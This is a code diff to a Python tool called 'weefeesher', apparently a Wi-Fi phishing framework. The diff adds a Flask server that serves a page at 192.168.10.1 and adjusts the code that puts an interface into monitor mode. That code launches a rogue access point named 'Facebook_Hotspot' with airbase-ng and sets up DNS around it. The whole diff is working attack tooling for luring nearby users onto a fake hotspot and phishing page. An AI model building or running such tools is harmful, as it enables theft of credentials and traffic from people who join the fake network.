@@ -7,6 +7,11 @@ import signal
 import os
 
 from weefeesher.utils.output import Logger
+from flask import Flask,flash,render_template
+
+#import logging
+#log = logging.getLogger('werkzeug')
+#log.setLevel(logging.ERROR)
 
 here = os.path.dirname(os.path.abspath(__file__))
 
@@ -21,6 +26,17 @@ def restore_iptables():
     subprocess.call('iptables-restore < /tmp/weefeesher.iptables.state', shell=True)
     subprocess.call('rm -f /tmp/weefeesher.iptables.state', shell=True)
 
+class Web():
+
+    def __init__(self):
+        self.app =  Flask(__name__)
+
+    def run(self):
+        @self.app.route('/')
+        def index():
+            return render_template('index.html')
+
+        self.app.run('192.168.10.1',80)
 
 class Dnsmasq():
 
@@ -78,21 +94,16 @@ def signal_handler(signal, frame):
 def launch_ap(iface):
     Logger.info('Shutting down phishing interface %s' % iface)
     subprocess.call('ip link set %s down' % iface, shell=True)
-    Logger.info('Creating mon0 interface on physical interface %s' % iface)
-    subprocess.call('airmon-ng start %s &> /dev/null' % iface, shell=True)
-    Logger.info('Making sure that mon0 interface is in monitor mode')
-    subprocess.call('/usr/sbin/ip link set mon0 down', shell=True)
-    subprocess.call('/usr/sbin/ip link set mon0 down', shell=True)
-    subprocess.call('/usr/sbin/ip link set mon0 down', shell=True)
-    subprocess.call('/usr/sbin/ip link set mon0 down', shell=True)
-    subprocess.call('iw mon0 set type monitor', shell=True)
-    subprocess.call('iw mon0 set type monitor', shell=True)
-    subprocess.call('iw mon0 set type monitor', shell=True)
-    subprocess.call('ip link set mon0 up', shell=True)
-    subprocess.call('ip link set mon0 up', shell=True)
-    subprocess.call('ip link set mon0 up', shell=True)
+    subprocess.call('ip link set %s down' % iface, shell=True)
+    subprocess.call('ip link set %s down' % iface, shell=True)
+    subprocess.call('iw %s set type monitor' % iface, shell=True)
+    subprocess.call('iw %s set type monitor' % iface, shell=True)
+    subprocess.call('iw %s set type monitor' % iface, shell=True)
+    subprocess.call('ip link set %s up' % iface, shell=True)
+    subprocess.call('ip link set %s up' % iface, shell=True)
+    subprocess.call('ip link set %s up' % iface, shell=True)
     Logger.info('Launching rogue access point...')
-    subprocess.Popen('airbase-ng --essid "Facebook_Hotspot" -I 60 mon0 &> /dev/null', shell=True)
+    subprocess.Popen('airbase-ng --essid "Facebook_Hotspot" -I 60 %s &> /dev/null' % iface, shell=True)
     time.sleep(2)
     subprocess.call('ip addr add 192.168.10.1/24 dev at0', shell=True)
 
@@ -114,5 +125,7 @@ def main():
     dns.backup()
     launch_ap(phishing_iface)
     dns.deploy()
+    web = Web()
+    web.run()
     while True:
         pass
